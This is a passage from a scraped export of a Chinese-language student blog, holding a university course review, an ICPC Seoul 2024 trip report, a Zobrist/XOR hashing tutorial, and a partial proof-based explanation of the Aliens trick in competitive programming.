生出一個題目來但報告也報得蠻爛的，醜到不能再醜了。最後竟然還可以拿 A-，比預期好了。\n存活分析 跟著 zihongxiao 去修的一個數學系開的課。這門課的主軸是 survivor function，$S(t)$ 代表某個實體能「存活」到時間 $t$ 的機率。整門課程會用不同的方法去想辦法從 experimental results 去 inference 出原本真正的母體的 survivor function 等統計資料，並證明誤差在抽樣夠多時會趨近於 $0$ 或是用什麼速度趨近於 $0$，也就是在證明一些 estimator 的性質。\n課程進行到途中會講到測度公理的機率論、stochastic process、martingale，但跟課中提的其他定理差不多，定義或是一些結論大概帶過去之後就會比較直覺的使用這些物件。例如在 martingale 的 filtration 那邊，雖然講了定義但我們超少用到，用到的時候感覺也是馬虎帶過去。\n作業就是把玩定義跟直接開一些定理去證一些事情，最後面會讓我們完成上課沒有證明完的一些 lemma。老實說，我覺得這些統計的定理越到後半學期都越來越醜，但可能學問就得是這樣子吧。雖然我覺得我這門課有盡力，但拿這個 A+ 感覺還是有點不踏實。\n數位系統與實驗 講的主題大概是布林代數，怎麼用簡單的 logic gate 去拼出一個 boolean expression，例如 minterm expansion、kmap 等，大多是用來手算的方法。後半學期會講 flip-flop，即正反器，以及類似 finite state machine 的應用。\n有四次手寫作業跟兩次 lab 作業，lab 作業是讓我們寫一些 verilog 並計算一些能優化的 latency 之類的部份。期中考跟期末考印象中都可以帶大抄，分別考了 98 跟 90，最後是拿了 A+。\n作業系統 系上的必修課程。大致上的主題如下：\nmultiprocess/multithread 跟 context switch CPU scheduling 記憶體的 stack 和 heap，以及 virtual memory、cache 等 file system、disk scheduling 等 非同步程式的同步問題，關鍵字可能是 race condition、mutex、semaphore、critical section 對我來說，背誦的部份還是佔大多數，一大堆不能望文生義的專有名詞砸在臉上，然後例如介紹 cache 的時候每個數字或是步驟都非常具體，具體到我會覺得這應該要是某個特定的硬體或是作業系統才會精確的就是這個數字，但這些東西又必須不得不背下來，就像是生物科那樣觀察、發明、分類一些現象，我真的沒有辦法抓到課的本質。\n作業看起來是把 xv6 這個迷你的作業系統挖空讓我們填一些程式碼，雖然 spec 裡面會告訴你要改哪些檔案，但你會需要看懂一些其他部份在寫什麼，要從給的一整坨作業系統的 code 裡面撈出關注的部份，抱團會比較輕鬆。小小抱怨一下我的第一次程式作業因為 wrong file structure 扣了 10 分，但他給的 zip 檔案裡面包了 __MACOSX 這種鬼東西。然後第二次程式作業被扣了 7 分，忘記是為什麼但大概是漏了一些 edge case，剩下的第三次跟第四次都沒有被扣分。\n考試的部份，期中和期末我的分數和平均分別是 71/62 和 87/71，A+ 率是 10%，我最後拿了 A，算是有點小遺憾但不意外。\n現代科學與心靈科學 內容完全不像是資工系的課。簡單來說有點像是老高說書講的內容，有些心理學、物理學上確實是真的內容，但又穿插一些感覺很玄的哲學理論。很玄的部份舉例來說就像是期中考題裡面的其中一題，題目和我的回答如下：\n如果未來的科學研究發現halting problem對人類而言是undecidable，那這樣的科學證據是支持Penrose教授所提出量子力學的作用在意識的形成中扮演關鍵性角色的假說抑或是提供一個反例? 請簡述你/妳的推論邏輯。\nIf future scientific researches confirm that the halting problem is not undecidable for human beings, then do you agree with Prof. Penrose regarding his hypothesis that quantum mechanics plays an important role in the formation of our consciousness? Please briefly describe your reasoning.\n您的答案：\n在量子計算的領域中，引入量子效應並不會讓原本 undecidable 的問題變為 decidable。因此若 halting problem 對人類是 undecidable，我們仍然可以相信量子力學在意識的形成中扮演關鍵性角色。\n然後這題有拿滿。我覺得上課有很多論證仔細想想我會認為是不嚴謹的。\n期中的考試是 NTU cool 線上的方式，而期末是我們可以自己選擇要線上考試或是實體去考（我是選實體去），開放帶電腦進去查資料，所以考前我基本上就瀏覽過所有投影片，知道什麼關鍵字可以對到什麼段落，以及弄一個文字檔讓我可以 ctrl-f。期中和期末我的分數和平均分別是 95/93 和 85/88。\n另外還有要做一個期末報告，形式是交一個簡報檔到 NTU cool。不知道是我的選題跟老師想要的不一樣，還是篇幅內容太少，只拿了 80 分，平均是 84 分。最終是拿了 A，現在來看好像也沒有修這門課的必要（？）\nNASA 三階 跟以往的形式一樣，在三階的時候我們要做一個跟我們組有關的 project，但幾乎沒什麼限制。我們這組做了兩件事，一個是讓 LDAP 有一個 replication server 並且可以在主 server 下線時讓副 server 支援，另一個則是讓工作站組的一些統計資料傳到原本別組就有在用的一個 grafana 監控服務。我負責的部份是，把原本就有在統計的統計資料開一個新的 API endpoint 出來，傳指定的 json 格式給另一個人接，大致上就是改寫一點點的 C++（沒錯，用 C++ 寫的後端）。這樣的分工確實有點心虛，但我這時候幾乎還沒懂多少我們組內部機器（感覺最懂的是 peach 老大），這學期的其他課也很多事，只能被動的分到什麼就做什麼。報告的時候老師會來聽，被提問了好幾個有關 LDAP 的問題但感覺問到一半的時候，老師跟 peach 的頻道才對上。但老師看起來還是不太喜歡我們這學期的東西，結果還是拿了 A-，工作站組的宿命。\n機器學習 軒田老師的 ML 課程，用英文上課。HW 0 簡單得可怕，簡直不像在勸退任何人。\n其實在網路上都可以找得到課程影片了，我也不知道怎樣 summarize 這堂課比較好。總之就是教了很多機器學習的數學基礎。\n作業的形式比較特別，是選擇題加上各題的證明，但證明每次只會抽出一部分批改（當然因為事前不知道抽出哪些所以基本上還是全部要寫證明）。\n我在修的時候有一直聽到一些奇怪的批改標準，例如在最小平方法沒有算微分而是用配方法就被批改錯之類的。不過我個人自己並沒有遇到，只是會對助教的批改的信心不高。然後我就在作業翻車，想說助教是不是又看不懂我在寫什麼去找他吵架，結果我還真的有寫錯的地方，想挖個洞躲起來。因為只是某一行係數寫錯就要被扣一整題的 20 分，寄信給教授討到 15 分 QQ。\n另外還有一次是 HW 1 的選擇題的觀念題選錯，被扣一整題的 20 分。這我想找的藉口是一開始好像有說不要把作業跟別人互相看，所以我沒有去跟其他人對選擇題的答案，但被爆扣一次之後還是乖乖加入對答案卷卷團了。後面的作業沒有再被扣分，至少選擇題的部份應該是和大家對答案的功勞，證明的部份，我在撰文時在 gradescope 翻不到後面幾次 HW 的 regrade request 的紀錄，應該是順利的都滿分吧？忘記當時到底是怎麼進行的了。\n先附上成績的人權圖：\nfinal project 形式是 kaggle 上要 fit 某個訓練資料，有 public data 跟 private data。然後 final project 我和 joy 以及 zck 一組，我們大概在咖啡廳之類的地方討論跟實做了兩三次，然後回家再想辦法改進一些東西。我們在 kaggle 上的名次應該是在中間，結果我們的 final project 成績只有 775 分，滿分 900 分。不知道是真的這樣的結果太爛還是我們的報告做不好，最終我只有 HW 1 跟 final project 有被扣分結果只有拿到 A 的等第。btw casper 他們那組的 final project 超強的，認識的人超強就有一種我們不想輸的感覺，但時間的關係加上我不知道怎麼 train 都沒辦法在死線前再改進，聽說我的總成績好像跟 A+ 線蠻接近的，覺得真的很可惜。\n","permalink":"https://omeletwithoutegg.github.io/2024/11/29/csie-4th-sem/","tags":["CSIE","experience"],"title":"第四學期修課心得"},{"contents":"ICPC 首爾站 2024 遊記 以下用 C 跟 R 簡稱我的隊友。Day 2 正式賽會有分隔線，怕暴雷自己小心。\nDay -2 飆趕國文作業，寫完之後倒頭大睡。\nDay -1 作息亂掉然後被硬拉去下午五點到十點團練。\nDay 0 從桃機飛往仁川機場。\n搭上飛機之前各種意外，C 宣告他去買鍵盤所以會晚到，然後我們先報到的時候被提醒說原本 C 說要到的時間就是最後報到時間；然後就變成我和 R 去摩斯買了東西吃結果四十分鐘之後要安檢、出關、到登機口的局面，R 先吃完離開之後我吃完，我安檢出關很迅速但登機門走反方向搞得好趕。整個龜兔賽跑。\n這次長榮的飛機餐是豬肉炒米粉，我覺得不是很好吃，大概也有一些原因是我們嘴饞偷偷吃摩斯以及我本來就不喜歡米粉。抵達首爾只要兩小時，意外的很快。\n出關之後我們搭機場巴士離開機場到會場所在的高陽市一山東區，票價大概 27000 韓圜，要搭約一小時。然後下車等轉乘公車才感受到 12 度的冷。跟台灣的公車一樣用現金會很迷茫怎麼投，又有語言障礙所以更難投。最後從公車站走到飯店 KINTEX by KTree，check in 之後感覺這家飯店各方面都不錯，房間裡面還有洗衣機、電磁爐（不會用到）。不過淋浴間跟馬桶之間沒有門所以地會弄濕，而且也沒有免費提供牙刷。\n落地後的第一餐晚餐就是吃飯店樓下剛好有一個韓式烤肉店。CP 值感覺不算太高，不過好油好多肉好爽。很多小菜和點套餐附的豆腐煲都好辣，我一直拿水跟拿奶油玉米吃。吃完之後去一樣在飯店樓下的 7-11 逛了一下又買了香蕉牛奶跟冰淇淋。\n回飯店之後發現買的鍵盤的 enter 鍵佔據了美式鍵盤的 enter 右部和整個反斜線的位子，反斜線變到 enter 的左部。打了一下字，看來是白買了。\nDay 1 早上好晚起。睡前被問有沒有準備在學證明，事前沒有想到，只好隔天起來想辦法把在學證明印出來，C 去問飯店櫃台剛好櫃台可以印。\n下午一點半報到，所以我們大概十二點就去找會場。官網寫說會場在 KINTEX 二號展覽館四樓，不過展覽館蠻大的，一樓有一些吃的地方但不太看得到哪裡是 ICPC，我們先進去一家土耳其 kebab 捲店吃了午餐（感覺小貴），出來找個電梯結果就看到 ICPC 的立牌了，搭到四樓就是報到處。順帶一提好像剛好是 BlueArchive 的什麼活動所以展覽館外牆上有 BlueArchive 的大廣告，而且報到處正好就是那個廣告的內側，因為是透明的外牆所以可以從內側看那個廣告。蔚藍檔案．啟動！\n被華為的人稍微搭話，似乎是因為我穿著新加坡 IOI T。報到的時候有一個櫃台專門給 foreign teams 好評，但馬上就扣回去因為他要我們填一個上面全部寫韓文的單子，似乎是個資收集書以及填要寄放哪些物品到時候比賽用，雖然櫃台的人有講解但還是嚇到。\n把軟軟和 codebook 裝在透明袋子裡拿去寄放之後稍微看了一下戰利品，這次有一個提袋、T-shirt、傘、小吊飾，還有華為的提袋跟小玩偶（我沒拿小玩偶因為要填表單）。感覺送傘很剛好，因為我最近剛丟傘。在等待室等測機開始的時候也有看到推特上一些選手發他們到了的消息。等候室是各種拿麥克風用韓語宣佈事情，但我一點都聽不懂他們講什麼，感受到台中站的外國隊伍聽到中文是什麼心情了(X) 測機快開始的時候英語的頻率也開始增加，至少稍微知道要做什麼了，但不知道什麼時間要專心聽英語，有時候就會不小心漏聽，不過周圍的工作人員指示還是都是韓文，常常有點無所適從。\n進到比賽會場進行測機以後才看到我們的鍵盤跟我們習慣的美式鍵盤配置差了更多，這次 enter 佔據了更多的位子，然後反斜線被放到原本的 backspace 左邊，鍵盤上面甚至是印韓圜符號，跟 JIS 鍵盤有點類似，但總之打起來超級不習慣，超可怕。趕緊舉手請工作人員問能不能換一個還有明天怎麼辦，他們先幫我們換了之後表示明天座位會 shuffle 明天有問題再說。換來的新鍵盤打起來有點重，感覺也有點費力。\nPC 環境跟台中站、越南站還有 World Finals 都大致一樣，但竟然預設是韓文輸入法，開場大概要優先把韓文輸入法關掉。我們選用 konsole 當 terminal。測機題目是去年的 regional 題，R 從 QOJ 把 AC code 抄起來在開場 9 分鐘過所有題。測起來 judge 的時間跟我們本機的時間大致差不多，python 版本不一樣，GCC 應該夠新有 C++ 20 可以用。測機的時候沒有 pdf statement 所以問了個 clarification，另外也問了能不能用 #pragma。\n我們測完有點晚，所以把東西收一收就走了，特別的是我們名牌要還給他們，明天應該是看 T-shirt 入場。晚餐不知道為什麼跑去 KINTEX 附近吃人蔘雞湯，第一次知道米飯是包在雞肉裡面。喝到最後都是中藥味所以沒有完全吃乾淨。\n外面氣溫 8 度，好冷。走回飯店之後迎面看到推特上有追蹤的 riyuna 本人，但我太社恐沒有認親環節。回來之後一邊耍廢，一邊精神一些往年題目以及 ABC，還有把這篇遊記寫到目前為止的進度。等等計畫去 7-11 買明天的早餐之後洗澡睡覺。\nDay 2 今天是正式賽。早上七點半起床吃昨天在便利商店買的三明治，結果要出門之前 R 突然表示他的眼鏡鏡片整個掉下來，這根本不知道怎麼修，嚇死，結果 C 發揮他的童軍力量，把不知道哪來的一塊衣服標籤用他帶的剪刀剪出一小條類似緞帶的東西，然後把他的鏡框壞掉的部份綁起來。雖然不知道能撐多久但也只能先走到 KINTEX。冷。\n手機必須裝在袋子裡放在等候室，不過可以穿著外套以及帶著鉛筆盒跟一些巧克力走進會場，門口會有工作人員用金屬探測器掃XD。看起來似乎是按照等候室的位子前後一排一排叫進會場，但因為是用韓文完全聽不懂，只能讀一下空氣。\n會場的桌上就有水，並且開賽前就發了一個餐盒。主持人定期的用韓文跟英文喊 do not touch any thing on the desk。結果今天坐到的座位鍵盤又是大 enter 的類型，C 趕緊跑去跟工作人員講，結果他們拿來兩個一樣是大 enter 的問我們要換哪個，還好我們有看到隔壁坐的 AMATSUKAZE 電腦插著的鍵盤剛好就是美式鍵盤，而且他們其實有自己帶自己的鍵盤（被放在透明袋子裡），最後成功換過來，而且打起來相當順手。工作人員還戳了一下重開機，好像是怕電腦沒抓到鍵盤之類的。\n所有隊伍都進場之後宣佈可以登入電腦跟 domjudge，還可以「setup develop environment」，但不能寫 template code，雖然看周圍都在設定 IDE 但我們是用 vim，覺得寫 vimrc　如果被查很麻煩所以就乾脆等開場再抄。開賽的時候還播了一個不知道是什麼的音樂。\n開賽大致打完 vimrc 之後 R 就跳上來把 A 題開了，在 5 min 的時候，竟然是全場首殺（？）然後我就緩慢的看其他題目，B 題跟 L 題還算是順順開出來，B 題也太既出，不過 G 題更是一個原題，R 丟給我激動的問是不是典中典但我被嚇到根本沒有好好學過這題。接下來 J 題 R 寫了一個解，雖然有跟我大概確認但丟上去還是 WA 了，感覺會不太妙趕快把他搖下來，結果下來就發現有怪怪的，趕緊修正成用二分搜再加上兩邊貪心。F 題也陸陸續續有人過，C 有丟出一些想法但我一直覺得像在喇分。\nC 題感覺時間很緊，但有人過了而且也沒想到什麼寫法就請 R 跳上去寫，然後出了好幾個 bug，跟一直在做怪怪優化的 F 題交替使用電腦時間。看了 H 題之後第一個想到的解是重心剖分，但感覺 1e6 兩個 $\\log$ 就不會過，只能先擱置。F 題是要構造交換次數 $\\leq 0.7n^2$ 的某種交換的排序方法，因為其他題都不會做我大概畫了三十分鐘這題都沒有進度（我要馬後炮我有想到官解那個方向但算錯次數\u0026hellip;），結果我們最後的解法基本上就是感覺很隨便的幾個 heuristic，加上隨機 tie-breaking，並且一直隨機直到在這個特定的 n 會過，沒想到竟然就過了，什麼隨機鬼題。C 題一個 bug 是題目要求「uncolored points」但沒判，另一個是在維護最多四個顏色的時候忘記把重複的消掉，兩個 bug 修掉終於 C 題也過了。\nC 題寫完之後沒題會做，商量一下變成我跳上去寫 H 題的重心剖分。結果寫了快四十分鐘，然後本地隨機生測資要跑 0.8 左右，非常抖，傳上去果然 TLE。交給 R 寫他宣稱會做了的 E 題大概寫了 20 分鐘之後得到 WA。我在機下想的時候想到 K 題怎麼做，寫三分鐘就過了。可惜過了這題已經是本場巔峰。在 E 題找到幾個 typo 型的 bug，然後發現有漏 case，改了之後傳上去仍然 WA，只好手構測資發現輸出非常誇張，又發現漏的 case 完全修得不夠，然後因為又有一些地方寫錯所以構完測資又手算一堆東西，不知不覺就又變成三人都盯著電腦看 debug 輸出的局面。大概印了至少五份 E 題的程式碼，桌上和地上的紙非常混亂。\nE 題在暴傳的同時也在亂壓 H 暴傳，事後看起來怎麼會沒有人想到解法就不是兩個 $\\log$ 冷靜下來重新想一個解呢？總之丟給他們用電腦，我繼續看其他題目，發現 D 好像可以根號做完就跳上去寫。四小時左右才寫完根號的部份，後面還有一個子問題「有一個排列，每次 swap 指定的兩個位子之後輸出逆序數對」，一時想不到 BIT 套 PBDS 以外的寫法所以跳下來。寫 D 題的同時似乎 E 題討論了一下剛剛手構的 case 是哪裡錯，終於在 4:24 的時候過了。D 題又 debug 好一陣子寫暴力才過範測，然後改成樹套樹之後傳，結果 TLE，比賽剩下只有十幾分鐘，我就開始想說是不是要用 CDQ 但寫不完，但如果我有把 code 印下來冷靜一點也許我會發現我在 rebuild 一塊的時候花了 $O(N)$ 而不是塊大小，這件事我在比賽最後 25 秒才想到，比賽就在我對 D 題做無謂的壓常下結束了。\n開版之後最終 H 題過的比我們想像的數量多，交大他們也有過這題（雖然聽他們自己說他們是 map 的單調隊列啟發式合併兩個 log，但我猜其實複雜度是一個 log 只是他們沒注意到），然後我們最終拿到被夾在 AMATSUKAZE 跟越南的隊伍 gugugaga 中間的第六名，AMATSUKAZE 比我們多過一題 H。\n比完之後先不能離開，因為有人有延時，但他們的作法竟然是直接把整個比賽加時間。我就邊吃他發的餐盒，吃起來還蠻不錯的。回到等候室之後就是不間斷的韓語轟炸，先是一些韓語致詞之後又有兩個人全韓語的 tech talk （其中一個好像是前幾年的冠軍跟 World Finalist）聽到我快要睡著，還有精美的全韓文題解，外國隊伍也需要人權QQ 最後終於來到開版的時間，結果也是用韓語開版，至少隊伍名稱和題號都還是英文聽得懂。他的開版網頁好像有一些更新，但最顯眼的是每次翻牌之後就會有奇怪的頻閃的 bug。\n不知道怎麼檢討但總之感覺接近退役（這次總該是真的了），有點空虛的離開比賽會場。他們說有招待我們晚餐，然後到指引的餐廳吃一個像是牛肉湯的東西，配白飯跟小菜。還不錯吃。然後我們就坐在日本隊伍旁邊，吃完花了很久鼓起勇氣再跟 tatyam 打招呼（用英文，不敢用日文@@）以及跟他帶（？）的隊員們 show 一下我的推特還有尬聊三句，結果最後我的推特沒有收到新追蹤，好 QQ\n走回飯店的路上聽謝旻錚教授講一些 ICPC 的事情（也屬於尬聊），然後我在飯店底下的 7-11 又買了一些東西。最後在樓上洗完澡並繼續寫這篇部落格。已經十一點了而且隔天要早起去機場，明天大概也只是單純的搭飛機回去的行程，所以本文就在此打住好了。\n遊記真的過期就寫不出來了。hue city 的已經對我來說超級遠的感覺了。\n","permalink":"https://omeletwithoutegg.github.io/2024/11/22/icpc-korea-regional-2024/","tags":["experience","blog"],"title":"ICPC Korea Regional 2024"},{"contents":"Zobrist Hash / XOR hash 非常簡單的一篇文章，只是看到沒有什麼中文材料就來科普（？）一下。\nDescription Zobrist hash 的用處是快速比較集合之間是否一樣。先令 $U$ 是我們所關心的物件的集合，對於每個物件 $u \\in U$，我們都指定一個隨機的 $w$-bit 的二進位數字 $h(u)$ 給他，接著我們在比較兩個集合 $S, T \\subseteq U$ 是否一樣的時候，我們直接當作比較 $\\bigoplus _ {u \\in S} h(u)$ 和 $\\bigoplus _ {u \\in T} h(u)$ 是否一樣，這樣只要 $w$ 夠大的話就有夠高的機率正確了。\n兩者一樣等價於 $\\bigoplus _ {u\\in S\\oplus T} h(u)$ 為 $0$，其中 $S\\oplus T$ 是對稱差集。兩個集合不一樣若且唯若對稱差集非空，而由於我們每個數字每個 bit 都是隨機的，所以當對稱差集非空的時候，這個 hash 的這個 bit 為 0 的機率是 $1/2$。\n因為要 $w$ 個 bit 都是 $0$ 才會把不一樣誤判成一樣，我們可以知道一次比較只有 $2^{-w}$ 的機率錯誤。常取的值會是 $w=64$。\n例題 給定一個長度 $N$ 的序列 $a_1,\\dots,a_N$，有 $Q$ 個詢問每次問一個區間 $[l, r]$ 是不是一個 $1$ 到 $r-l+1$ 的排列。\n保證 $N, Q \\leq 10^6, 1 \\leq a_i \\leq N$\n取 $w = 64$，也就是用 mt19936_64 對每個 $1 \\leq x \\leq N$ 的 $x$ 生成一個隨機的數字 $h(x)$，每次詢問的時候我們直接比較 $\\bigoplus _ {l \\leq i \\leq r} h(a_i)$ 是不是等於 $\\bigoplus _ {1 \\leq x \\leq r-l+1} h(x)$ 就可以了。兩者都可以前綴和快速算，因此勉強可以算是個 $\\mathcal{O}(N + Q)$ 的演算法吧。\n來分析一下正確率吧。因為一個區間內的所有數字不一定是集合，前面的論證不一定適用，所以重新來一遍。\n如果真的是排列的話算出來的 hash 一定相同，所以我們要算的是詢問的區間不是一個排列的時候恰好 hash 一樣的機率。這樣，一定存在一個 $1 \\leq x \\leq r-l+1$ 使得 $x$ 不在區間裡面，也就是說在算 $\\bigoplus _ {l \\leq i \\leq r} h(a_i)$ 時完全不會算到 $h(x)$，且 $\\bigoplus _ {1 \\leq x \\leq r-l+1} h(x)$ 當中剛好算到 $h(x)$ 一次。然而 $h(x)$ 的特定一個 bit 是 $0$ 的機率和是 $1$ 的機率一樣都是 $1/2$，因此 hash 在這個 bit 不一樣的機率確實是 $1/2$。\n於是一次詢問的錯誤率是 $2^{-w}$，可以知道 $Q$ 次詢問有任何一次錯誤的機率會小於等於 $Q2^{-w} \\approx 10^{-12}$（union bound），可以說幾乎不可能（每毫秒跑一筆測資的話，$10^{12}$ 毫秒約 31 年才會錯一筆）。通常競賽中每筆測資的正確率有 $10^{-3}$ 到 $10^{-4}$ 就可以傳了，畢竟通常測資的數量級大概頂多就一兩百筆。\n另一個例題 給定一個長度 $N$ 的序列 $a_1,\\dots,a_N$，問有幾個區間使得區間裡面所有數字在區間裡面出現的次數都是偶數次。\n保證 $N \\leq 10^6, 1 \\leq a_i \\leq N$\n一樣先做隨機的 mapping，接著只要回答有幾個區間 $[l, r]$ 使得 $\\bigoplus _ {l\\leq i\\leq r} h(a_i) = 0$ 就可以了，可以用前綴和以及 hashmap 勉強算是做到 $\\mathcal{O}(N)$。\n「所有數字出現偶數次」等價於「出現奇數次的數字的集合是空集」。根據開頭的論證，對於每個區間 $[l, r]$，「出現奇數次的數字的集合是空集」和「$\\bigoplus _ {l\\leq i \\leq r} h(a_i) = 0$」不同值的機率可以被壓在 $2^{-w}$ 以下。總共有 $N(N+1)/2$ 個區間，所以一樣有任何一個區間錯的機率低於 $N(N+1)/2 \\cdot 2^{-w} \\approx 10^{-6}$。\n這裡必須要小心的是，雖然我們的演算法只有 $\\mathcal{O}(N)$，但其實上述的論證會需要所有區間的「集合一樣」和「hash 一樣」都同值，而總共有 $\\mathcal{O}(N^2)$ 個區間，「任何一個區間錯」的機率直接用 union bound 只能壓到「特定一個區間錯」的機率的 $\\mathcal{O}(N^2)$ 倍，這樣的話取 $w=32$ 會不夠。\n對於不同的題目使用 union bound 的時候更是要小心，例如我們可以將這題的區間改成 subsequence，那麼雖然每個事件只有 $2^{-w}$ 的機率錯，但計算整個問題的正確性依賴於 $2^N$ 個不同的事件，所以使用這樣的 hash 可能會錯得很離譜。\n參考資料與額外閱讀 https://codeforces.com/blog/entry/129907 https://trap.jp/post/1594/ 如果第二個例題不是問偶數而是問 $3$ 的倍數？又或者是 $k$ 的倍數？ https://blog.hamayanhamayan.com/entry/2017/05/24/154618 雖然在第一個例題中，我們看似可以用 zobrist hash 維護 multiset 的 hash，但有些問題是需要別的方法的。 結 下一篇文章不知道有什麼材料。BWT？\n不過明天國文要段考。\n","permalink":"https://omeletwithoutegg.github.io/2024/10/21/zobrist-hash/","tags":["math","bitmask","tutorial"],"title":"Zobrist Hash / XOR hash"},{"contents":"Aliens trick 的一些事實列舉與說明 本文主要基於 https://noshi91.hatenablog.com/entry/2023/11/20/052227 撰寫。\nDescription 令 $X = \\mathbb{Z} \\cap [L, R]$ 為一非空集合。\n考慮下凸函數 $f : X \\to \\mathbb{Z}$（註：即 $f(x) - f(x - 1) \\leq f(x + 1) - f(x)$，可以用 U 型來想像）。\n令 $g: \\mathbb{R} \\to \\mathbb{R}, g(p) = \\min _ {x \\in X}(f(x) + px)$，代表 penalty 為 p 時算出的最佳解。\n在以前大家學過的 Aliens trick 當中的設定會是特定的 $f(k)$ 很難算（例如郵局設置問題中設置 $k$ 個郵局的最小花費）而 $g(p)$ 比較好算（例如郵局設置問題中每個郵局多花 $p$ 的最佳解），我們需要二分搜出恰當的 penalty，使得取到最佳解的 $x$ 恰好是 $k$，或至少介在小於 $k$ 和大於 $k$ 之間的分界點。\n在二分搜的判定中，會需要計算 $x_p^* \\in \\textrm{argmin} _ {x\\in X}(f(x) + px)$（註：本文中 argmin 的定義會採用集合版本的），也就是在目前的 penalty 底下的最佳解當中 $x$ 是取值多少，或者可以說是被罰了幾個 penalty。這件事在 tie-breaking 的時候會變得比較麻煩，若 $f(x) + px$ 在多個 $x$ 都可以取到最小值，則我們會需要取最小的這種 $x$（也可以取最大的，但細節會稍微改變）；若無法算出最小的 $x$ 的話就無法直接以此作為二分搜的判定。本文目的為介紹一個不需要還原 $x_p^*$ 的一個 Aliens trick 寫法。\nFacts 方便起見，定義 $\\nabla f(x) = f(x) - f(x - 1)$ 和 $\\Delta f(x) = f(x + 1) - f(x)$，分別為 $f$ 的後向差分和前向差分。作為特例，若 $x-1 \\not\\in X$ 則定義 $\\nabla f(x) = -\\infty$；類似地，若 $x+1\\not \\in X$ 則定義 $\\Delta f(x) = \\infty$。$f$ 的凸性又可以寫成 $\\nabla f(x) \\leq \\Delta f(x)$。\n$g$ 是上凸函數。 強對偶性：事實上，$f(k) = \\max _ {p\\in I} (g(p) - pk)$。畫重點！\n其中，$I$ 必須是足夠大的 compact set（不懂的話可以想像 $I$ 就是區間）。足夠大指的是 $[-\\Delta f(k), -\\nabla f(k)]$ 和 $I$ 的交集非空。以後知道上下界要取多少了！ $\\textrm{argmin} _ {x \\in X}(f(x) + px) = \\mathbb{Z} \\cap [l_p, r_p]$ 是一個區間。 對於所有整數的 $p$，$l_p$ 和 $r_p$ 就是 $g(p + 1) - g(p)$ 和 $g(p) - g(p - 1)$。 對於所有非整數的 $p$，$l_p = r_p = \\frac{g(p) - g(\\lfloor p \\rfloor)}{p - \\lfloor p \\rfloor} = \\frac{g(\\lceil p \\rceil) - g(p)}{\\lceil p \\rceil - p}$，即 $g$ 在每個整數段呈線性。\n這是因為 $f$ 的值域是整數而有的特性。 Explanation 1 和 2 是兩個相關的較有用的事實。由於 $g(p)$ 和 $-kp$ 兩個（對 $p$ 的）上凸函數的和仍是上凸函數，尋找 $g(p) - pk$ 的最大值可以用三分搜、對差分二分搜，或是黃金比例搜來計算。使用強對偶性，便不需要還原 $x_p^*$ 也可以在 $\\mathcal{O}(\\log C)$ 次求解 $g(p)$ 的時間以內計算 $f(k)$。\nAliens trick 的上下界也是件需要小心的事情，根據本文中的證明，上下界的範圍只要包含 $f$ 在 $k$ 兩旁的差分的相反數，就可以得到答案。\n3, 4, 5 的定位比較接近幾個和 $g$ 有關的小知識，主要是幫助理解和想像 $f$ 與 $g$ 函數的關係。\n額外的，由 5 我們可以知道我們如果選擇非整數的 $p$ 則 $\\textrm{argmin} _ {x \\in X}(f(x)+px)$ 是一元集合，所以例如用 $n + 0.5$ 或是 $n + \\epsilon$ 等想法去搜就一定會有一個唯一的 $x_p^*$，不過這其實幾乎等價於用某種權重在處理 tie-breaking 就是了。\ng 是上凸函數 對於所有 $\\alpha + \\beta = 1, \\alpha \\geq 0, \\beta \\geq 0$，\n$$\n\\begin{align*}\ng(\\alpha a + \\beta b)\n\u0026amp; = \\min _ {x\\in X}\\left[f(x) + (\\alpha a + \\beta b) x\\right] \\\\\n\u0026amp; = \\min _ {x\\in X}\\left[(\\alpha + \\beta) f(x) + (\\alpha a + \\beta b) x\\right] \\\\\n\u0026amp; = \\min _ {x\\in X}\\left[\\alpha(f(x) + ax) + \\beta(f(x) + bx)\\right] \\\\\n\u0026amp; \\geq \\alpha \\min _ {x\\in X} (f(x) + ax) + \\beta \\min _ {x\\in X}(f(x) + bx) \\\\\n\u0026amp; = \\alpha g(a) + \\beta g(b)\n\\end{align*}\n$$\n$g$ 因此也是連續的。\n強對偶性 弱的對偶性較易證明。固定一特定的 $k \\in X$，對於所有 $p$，根據定義我們有\n$$g(p) = \\min _ {x\\in X} (f(x) + px) \\leq f(k) + pk$$\n所以便得到弱對偶性 $f(k) \\geq \\max _ {p\\in I} (g(p) - pk)$。弱對偶性在 $f$ 非凸的時候也是正確的。\n引理 0：給定 $k \\in X, p \\in \\mathbb{R}$，若 $p \\in [-\\Delta f(k), -\\nabla f(k)]$，則 $k \\in \\textrm{argmin} _ {x\\in X}(f(x) + px)$。\n證明：移項得 $\\nabla f(k) \\leq -p \\leq \\Delta f(k)$。若 $x \u0026gt; k$ 則 $f(x) - f(k)$ 可以寫成 $\\sum _ {i=k} ^ {x-1} \\Delta f(i)$，又由 $f$ 的凸性可以知道每一項都大於等於 $\\Delta f(k)$，所以總和會大於等於 $(x - k) \\cdot (-p)$，因此 $f(x) - f(k) \\geq (x - k) (-p)$ 移項得到 $f(k) + p k \\leq f(x) + p x$。$x \u0026lt; k$ 部份證明類似。\n由 $f$ 的凸性以及對 $I$ 的限制，存在一個 $p^*$ 同時屬於 $I$ 以及引理 0 中提到的區間。由前述引理可以推出\n$$\n\\begin{align*}\nf(k)\n\u0026amp; = (f(k) + p^* k) - p^* k \\\\\n\u0026amp; = \\min _ {x\\in X} (f(x) + p^*x) - p^*k \\\\\n\u0026amp; = g(p^*) - p^* k \\\\\n\u0026amp; \\leq \\max _ {p\\in I} (g(p) - pk)\n\\end{align*}\n$$\n因此與弱對偶性合在一起便得到強對偶性 $f(k) = \\max _ {p\\in I} (g(p) - pk)$。因為 $I$ compact 且 $g$ 是連續的所以等號右側的 $\\max$ 是 well-defined。\n引理 0 的逆命題也是對的，如下：\n引理 1：給定 $k\\in X, p\\in\\mathbb{R}$，若 $k \\in \\textrm{argmin} _ {x\\in X}(f(x) + px)$，則 $p \\in [-\\Delta f(k), -\\nabla f(k)]$。\n證明：對於右界部份，若 $k - 1 \\in X$，則 $f(k - 1) + p\\cdot (k - 1) \\geq f(k) + pk$ 移項得到 $p \\leq -\\nabla f(k)$。若 $k - 1 \\not\\in X$ 則顯然 $p \\leq \\infty$。左界部份證明類似。\n取得最小值的 $x$ 是一段區間 注意到 $f(x) + px$ 仍是下凸函數，因此對於所有 $a \u0026lt; b \u0026lt; c$，若 $f(x) + px$ 在 $a, c$ 都可以取得最小值，由凸性可以得知 $b$ 點也會取得最小值。當然，取得最小值的 $x$ 們也不會是空集合，但有可能是退化成恰好一個點的情形。\n以 g 表示區間的左右界 直覺上，$\\textrm{argmin} _ {x\\in 